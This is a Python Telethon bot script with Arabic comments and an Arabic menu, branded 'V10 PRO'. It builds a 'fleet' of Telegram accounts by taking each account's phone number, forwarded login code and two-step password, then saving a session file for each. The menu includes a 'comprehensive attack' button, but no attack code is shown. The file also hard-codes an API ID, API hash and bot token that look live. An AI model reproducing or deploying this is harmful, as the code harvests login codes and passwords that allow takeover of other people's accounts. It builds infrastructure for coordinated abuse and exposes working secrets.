import os, asyncio, threading, re, glob, random
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from flask import Flask

# --- [ سيرفر الويب لضمان استقرار Render ] ---
app = Flask('')
@app.route('/')
def home(): return "V10 PRO IS ONLINE"
def run_flask():
    app.run(host='0.0.0.0', port=10000)

threading.Thread(target=run_flask, daemon=True).start()

# --- [ بياناتك الرسمية ] ---
API_ID = 25880715
API_HASH = '0d1e0a5fe75236df18295a0f8b22b458'
BOT_TOKEN = '8650334560:AAHdC8sqyNJoRomjZ_7jAhjf2LF2JQluhxI'

bot = TelegramClient('v10_session', API_ID, API_HASH)

# --- [ القوائم ] ---
MAIN_MENU = [
    [Button.text("🚀 هجوم شامل", resize=True), Button.text("➕ إضافة حساب", resize=True)],
    [Button.text("📊 الإحصائيات", resize=True), Button.text("📢 قناة المطور", resize=True)]
]

# --- [ معالجة الأوامر ] ---
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond("🛡️ **V10 PRO Multi-Engine** جاهز للعمل يا سالم.\nاستخدم الأزرار للتحكم في الأسطول:", buttons=MAIN_MENU)

@bot.on(events.NewMessage(func=lambda e: e.text == "📊 الإحصائيات"))
async def stats(event):
    count = len(glob.glob('user_sessions/*.session'))
    await event.respond(f"📈 **إحصائيات الأسطول:**\n\n📦 الحسابات المربوطة: `{count}`\n📡 حالة السيرفر: مستقر ✅")

@bot.on(events.NewMessage(func=lambda e: e.text == "➕ إضافة حساب"))
async def add_acc(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("📱 أرسل الرقم مع مفتاح الدولة (مثال: +218...):")
        phone = (await conv.get_response()).text.strip().replace(" ", "")
        client = TelegramClient(f'user_sessions/{phone}', API_ID, API_HASH)
        await client.connect()
        try:
            req = await client.send_code_request(phone)
            await conv.send_message("📩 قم بتحويل (Forward) رسالة الكود هنا:")
            msg = await conv.get_response()
            otp = re.search(r'\b\d{5}\b', msg.text)
            if otp:
                try:
                    await client.sign_in(phone, otp.group(0), phone_code_hash=req.phone_code_hash)
                    await conv.send_message("✅ تم إضافة الحساب بنجاح!")
                except SessionPasswordNeededError:
                    await conv.send_message("🔐 أرسل كلمة سر التحقق بخطوتين:")
                    pw = (await conv.get_response()).text
                    await client.sign_in(password=pw)
                    await conv.send_message("✅ تم الربط بنجاح!")
            else: await conv.send_message("❌ لم يتم العثور على الكود.")
        except Exception as e: await conv.send_message(f"❌ خطأ: {e}")
        await client.disconnect()

async def main():
    if not os.path.exists('user_sessions'): os.makedirs('user_sessions')
    print("--- [ V10 PRO STARTING ] ---")
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
